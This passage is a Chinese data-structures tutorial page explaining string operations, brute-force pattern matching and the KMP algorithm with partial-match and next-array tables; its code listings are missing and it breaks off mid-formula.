<p>不同的高级语言对串的基本操作集可以有不同的定义方法。在上述定义的操作中，串赋值 StrAssign、串比较 StrCompare、求串长 StrLength，串联接 Concat 及求子串 SubString 五种操作构成串类型的最小操作子集，即这些操作不可能利用其他串操作来实现；反之，其他串操作（除串清除 ClearString 和串销毁 DestroyString 外）均可在该最小操作子集上实现。</p>
<h3> 串的模式匹配</h3>
<h4> 简单的模式匹配算法</h4>
<p>子串的定位操作通常称为串的模式匹配，它求的是子串（常称模式串）在主串中的位置。这里采用定长顺序存储结构，给出一种不依赖于其他串操作的暴力匹配算法。</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在上述算法中，分别用计数指针 <code>i</code> 和 <code>j</code> 指示主串 <code>S</code> 和模式串 <code>T</code> 中当前正待比较的字符位置。算法思想为：从主串 <code>S</code> 的第一个字符起，与模式 <code>T</code> 的第一个字符比较，若相等，则继续逐个比较后续字符；否则从主串的下一个字符起，重新和模式的字符比较；以此类推，直至模式 <code>T</code> 中的每个字符依次和主串 <code>S</code> 中的一个连续的字符序列相等，则称匹配成功，函数值为与模式 <code>T</code> 中第一个字符相等的字符在主串 <code>S</code> 中的序号，否则称匹配不成功，函数值为零。</p>
<p>简单模式匹配算法的最坏时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nm)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">nm</span><span class="mclose">)</span></span></span></span>，其中 <code>n</code> 和 <code>m</code> 分别为主串和模式串的长度。例如：当模式串为 <code>'0000001'</code>，而主串为 <code>'0000000000000000000000000000000000000000000001'</code> 时，由于模式中前 <code>6</code> 个字符均为 <code>0</code>，主串中前 <code>45</code> 个字符均为 <code>0</code>，每趟匹配都是比较到模式的最后一个字符时才发现不等，指针 <code>i</code> 需回溯 <code>39</code> 次，总比较次数为 <code>40 x 7 = 280</code> 次</p>
<h4> 串的模式匹配算法——KMP 算法</h4>
<p>在暴力匹配中，每趟匹配失败都是模式后移一位再从头开始比较。而某趟己匹配相等的字符序列是模式的某个前缀，这种频繁的重复比较相当于模式串在不断地进行自我比较，这就是其低效率的根源。因此，可以从分析模式本身的结构着手，如果己匹配相等的前缀序列中有某个后缀正好是模式的前缀，那么就可以将模式向后滑动到与这些相等字符对齐的位置，主串 <code>i</code> 指针无须回溯，并从该位置开始继续比较。而模式向后滑动位数的计算仅与模式本身的结构有关，与主串无关。</p>
<ol>
<li>
<p><strong>字符串的前缀后缀和部分匹配值</strong></p>
<p>要了解子串的结构，首先要弄清楚几个概念：前缀、后缀和部分匹配值。前缀指除最后一个字符以外，字符串的所有头部子串；后缀指除第一个字符外，字符串的所有尾部子串；部分匹配值则为字符串的前缀和后缀的最长相等前后缀长度。下面以 <code>ababa</code> 为例进行说明：</p>
<ul>
<li><code>a</code> 的前缀和后缀都为空集，最长相等前后缀长度为 <code>0</code></li>
<li><code>ab</code> 的前缀为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord"><span class="mord mathnormal">a</span></span></span></span></span>，后缀为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">{b}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord mathnormal">b</span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>∩</mo><mi>b</mi><mo>=</mo><mi mathvariant="normal">∅</mi></mrow><annotation encoding="application/x-tex">{a} \cap {b} = \varnothing</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5556em;"></span><span class="mord"><span class="mord mathnormal">a</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord mathnormal">b</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6633em;vertical-align:-0.0817em;"></span><span class="mord amsrm">∅</span></span></span></span>，最长相等前后缀长度为 <code>0</code></li>
<li><code>aba</code> 的前缀为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>a</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">{a, ab}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ab</span></span></span></span></span>，后缀为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">{a, ba}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ba</span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi>a</mi><mo separator="true">,</mo><mi>a</mi><mi>b</mi></mrow><mo>∩</mo><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mi>a</mi></mrow><mo>=</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">{a, ab} \cap {a, ba} = {a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ab</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ba</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord"><span class="mord mathnormal">a</span></span></span></span></span>，最长相等前后缀长度为 <code>l</code></li>
<li><code>abab</code> 的前缀 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi>a</mi><mo separator="true">,</mo><mi>a</mi><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mi>b</mi><mi>a</mi></mrow><mo>∩</mo></mrow><annotation encoding="application/x-tex">{a, ab, aba} \cap</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ab</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">aba</span></span><span class="mord">∩</span></span></span></span> 后缀 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mi>b</mi><mo separator="true">,</mo><mi>b</mi><mi>a</mi><mi>b</mi></mrow><mo>=</mo><mrow><mi>a</mi><mi>b</mi></mrow></mrow><annotation encoding="application/x-tex">{b, ab, bab} = {ab}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ab</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">bab</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord mathnormal">ab</span></span></span></span></span>，最长相等前后缀长度为 <code>2</code></li>
<li><code>ababa</code> 的前缀 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi>a</mi><mo separator="true">,</mo><mi>a</mi><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mi>b</mi><mi>a</mi><mo separator="true">,</mo><mi>a</mi><mi>b</mi><mi>a</mi><mi>b</mi></mrow><mo>∩</mo></mrow><annotation encoding="application/x-tex">{a, ab, aba, abab} \cap</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ab</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">aba</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">abab</span></span><span class="mord">∩</span></span></span></span> 后缀 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mi>a</mi><mo separator="true">,</mo><mi>a</mi><mi>b</mi><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mi>a</mi><mi>b</mi><mi>a</mi></mrow><mo>=</mo><mrow><mi>a</mi><mo separator="true">,</mo><mi>a</mi><mi>b</mi><mi>a</mi></mrow></mrow><annotation encoding="application/x-tex">{a, ba, aba, baba} = {a, aba}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ba</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">aba</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">baba</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">aba</span></span></span></span></span>，公共元素有两个，最长相等前后缀长度为 <code>3</code></li>
</ul>
<p>故字符串 <code>ababa</code> 的部分匹配值为 <code>00123</code>。这个部分匹配值有什么作用呢？</p>
<p>例如：主串为 <code>a b a b c a b c a c b a b</code>，子串为 <code>a b c a c</code></p>
<p>利用上述方法容易写出子串，<code>abcac</code> 的部分匹配值为 <code>00010</code>，将部分匹配值写成数组形式，就得到了部分匹配值（Partial Match, PM）的表。</p>
<table>
<thead>
<tr>
<th style="text-align:center">编号</th>
<th style="text-align:center">1</th>
<th style="text-align:center">2</th>
<th style="text-align:center">3</th>
<th style="text-align:center">4</th>
<th style="text-align:center">5</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">S</td>
<td style="text-align:center">a</td>
<td style="text-align:center">b</td>
<td style="text-align:center">c</td>
<td style="text-align:center">a</td>
<td style="text-align:center">c</td>
</tr>
<tr>
<td style="text-align:center">PM</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
</tr>
</tbody>
</table>
<p>下面用 <code>PM</code> 表来进行字符串匹配：</p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>第一趟匹配过程</strong>：发现 <code>c</code> 与 <code>a</code> 不匹配，前面的 <code>2</code> 个字符 <code>ab</code> 是匹配的，查表可知，最后一个匹配字符 <code>b</code> 对应的部分匹配值为 <code>0</code>，因此按照以下公式算出子串需要向后移动的位数：<em>移动位数 = 已匹配的字符数 - 对应的部分匹配值</em></p>
<p>因为 <code>2 - 0 = 2</code>，所以将子串向后移动 <code>2</code> 位，如下进行第二趟匹配：</p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>第二趟匹配过程</strong>：发现 <code>c</code> 与 <code>b</code> 不匹配，前面 <code>4</code> 个字符 <code>abca</code> 是匹配的，最后一个匹配字符 <code>a</code> 对应的部分匹配值为 <code>1</code>，<code>4 - 1 = 3</code>，将子串向后移动 <code>3</code> 位，如下进行第三趟匹配：</p>
<div class="language-text line-numbers-mode" data-ext="text"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>第三趟匹配过程</strong>：子串全部比较完成，匹配成功。整个匹配过程中，主串始终没有回退，故 KMP 算法可以在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n + m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span> 的时间数量级上完成串的模式匹配操作，大大提高了匹配效率。</p>
<p>某趟发生失配时，如果对应的部分匹配值为 <code>0</code>，那么表示己匹配相等序列中没有相等的前后缀，此时移动的位数最大，直接将子串首字符后移到主串当前位置进行下一趟比较；如果己匹配相等序列中存在最大相等前后缀（可理解为首尾重合），那么将子串向右滑动到和该相等前后缀对齐（这部分字符下一趟显然不需要比较），然后从主串当前位置进行下一趟比较。</p>
</li>
<li>
<p><strong>KMP 算法的原理是什么？</strong></p>
<p><em>移动位数 = 已匹配的字符数 - 对应的部分匹配值</em> 的意义是：</p>
<p>当 <code>c</code> 与 <code>b</code> 不匹配时，己匹配 <code>abca</code> 的前缀 <code>a</code> 和后缀 <code>a</code> 为最长公共元素。己知前缀 <code>a</code> 与 <code>b、c</code> 均不同，与后缀 <code>a</code> 相同，故无须比较，直接将子串移动 <em>己匹配的字符数 - 对应的部分匹配值</em>，用子串前缀后面的元素与主串匹配失败的元素开始比较即可。</p>
<p><strong>对算法的改进方法：</strong></p>
<p>已知：<em>右移位数 = 已匹配的字符数 - 对应的部分匹配值</em>。写成：<code>Move = (j - 1) - PM[j - 1]</code></p>
<p>使用部分匹配值时，每当匹配失败，就去找它前一个元素的部分匹配值，这样使用起来有些不方便，所以将 <code>PM</code> 表右移一位，这样哪个元素匹配失败，直接看它自己的部分匹配值即可。</p>
<p>将上例中字符串 <code>abcac</code> 的 PM 表右移一位，就得到了 next 数组。</p>
<table>
<thead>
<tr>
<th style="text-align:center">编号</th>
<th style="text-align:center">1</th>
<th style="text-align:center">2</th>
<th style="text-align:center">3</th>
<th style="text-align:center">4</th>
<th style="text-align:center">5</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">S</td>
<td style="text-align:center">a</td>
<td style="text-align:center">b</td>
<td style="text-align:center">c</td>
<td style="text-align:center">a</td>
<td style="text-align:center">c</td>
</tr>
<tr>
<td style="text-align:center">next</td>
<td style="text-align:center">-1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
</tr>
</tbody>
</table>
<p><strong>注意：</strong></p>
<ul>
<li>第一个元素右移以后空缺的用 <code>-1</code> 来填充，因为若是第一个元素匹配失败，则需要将子串向右移动一位，而不需要计算子串移动的位数</li>
<li>最后一个元素在右移的过程中溢出，因为原来的子串中，最后一个元素的部分匹配值是其下一个元素使用的，但显然已没有下一个元素，故可以舍去</li>
</ul>
<p>这样，上式就改写为：<code>Move = (j - 1) - next[j]</code></p>
<p>相当于将子串的比较指针回退到：<code>j = j - Move = j - ((j - 1) - next[j]) = next[j] + 1</code></p>
<p>有时为了使公式更加简洁、计算简单，将 next 数组整体 <code>+1</code>。因此，上述子串的 next 数组也可以写成：</p>
<table>
<thead>
<tr>
<th style="text-align:center">编号</th>
<th style="text-align:center">1</th>
<th style="text-align:center">2</th>
<th style="text-align:center">3</th>
<th style="text-align:center">4</th>
<th style="text-align:center">5</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">S</td>
<td style="text-align:center">a</td>
<td style="text-align:center">b</td>
<td style="text-align:center">c</td>
<td style="text-align:center">a</td>
<td style="text-align:center">c</td>
</tr>
<tr>
<td style="text-align:center">next</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">2</td>
</tr>
</tbody>
</table>
<p>最终得到子串指针变化公式：<code>j = next[j]</code>。在实际匹配过程中，子串在内存里是不会移动的，而是指针在变化。<code>next[j]</code> 的含义是：在子串的第 <code>j</code> 个字符与主串发生失配时，则跳到子串的 <code>next[j]</code> 位置重新与主串当前位置进行比较。</p>
<p>如何推理 next 数组的一般公式？设主串为：s<sub>1</sub>s<sub>2</sub> … s<sub>n</sub>，模式串为：p<sub>1</sub>p<sub>2</sub> … p<sub>m</sub>，当主串中第 <code>i</code> 个字符与模式串中第 <code>j</code> 个字符失配时，子串应向右滑动多远，然后与模式中的哪个字符比较？</p>
<p>假设此时应与模式中第 <code>k(k &lt; j)</code> 个字符继续比较，则模式中前 <code>k - 1</code> 个字符的子串必须满足下列条件，且不可能存在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>k</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>&gt;</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">k' &gt; k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.791em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> 满足下列条件：</p>
<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mrow></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msub><mi>P</mi><mn>1</mn></msub><msub><mi>P</mi><mn>2</mn></msub><mo>…</mo><mo>−</mo><msubsup><mi>P</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><msup><mo>=</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msub><mi>P</mi><mrow><mi>j</mi><mo>−</mo><mi>k</mi><mo>+</mo><mn>1</mn></mrow></msub><msub><mi>P</mi><mrow><mi>j</mi><mo>−</mo><mi>k</mi><mo>+</mo><mn>2</mn></mrow></msub><mo>…</mo><msub><mi>P</mi><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">'P_{1}P_{2} \dotsc - P_{k-1}' = 'P_{j-k+1}P_{j-k+2} \dotsc P_{j-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9019em;vertical-align:-0.15em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0933em;vertical-align:-0.3414em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-2.4169em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">+</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></p>
<p>若存在满足如上条件的子串，则发生失配时，仅需将模式向右滑动至模式中第 <code>k</code> 个字符和主串第 <code>i</code> 个字符对齐，此时模式中前 <code>k - 1</code> 个字符的子串必定与主串中第 <code>i</code> 个字符之前长度为 <code>k - 1</code> 的子串相等，由此，只需从模式第 <code>k</code> 个字符与主串第 <code>i</code> 个字符继续比较即可。</p>
<p>当模式串己匹配相等序列中不存在满足上述条件的子串时（可以看成 <code>k = l</code>），显然应该将模式串右移 <code>j - 1</code> 位，让主串第 <code>i</code> 个字符和模式第一个字符进行比较，此时右移位数最大。</p>
<p>当模式串第一个字符（<code>j = l</code>）与主串第 <code>i</code> 个字符发生失配时，规定 <code>next[1] = 0</code>。将模式串右移一位，从主串的下一个位置（<code>i + 1</code>）和模式串的第一个字符继续比较。</p>
<p>通过上述分析可以得出 next 函数的公式：</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>n</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mrow><mi>k</mi><mi mathvariant="normal">∣</mi><mn>1</mn><mo>&lt;</mo><mi>k</mi><mo>&lt;</mo><mi>j</mi><msup><mtext>且</mtext><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msub><mi>p</mi><mn>1</mn></msub><mi>L</mi><msubsup><mi>P</mi><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><msup><mo>=</mo><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msub><mi>p</mi><mrow><mi>j</mi><mo>−</mo><mi>k</mi><mo>+</mo><mn>1</mn></mrow></msub><mi>L</mi><msubsup><mi>p</mi><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup></mrow><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>当此集合不空时</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1</mn><mo separator="true">,</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>其他情况</mtext></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">
next[j] = \begin{cases}
  0, &amp; j = 1 \\
  max{k | 1 &lt; k &lt; j \text{且} 'p_{1}LP_{k-1}' = 'p_{j-k+1}Lp_{j-1}'}, &amp; \text{当此集合不空时} \\
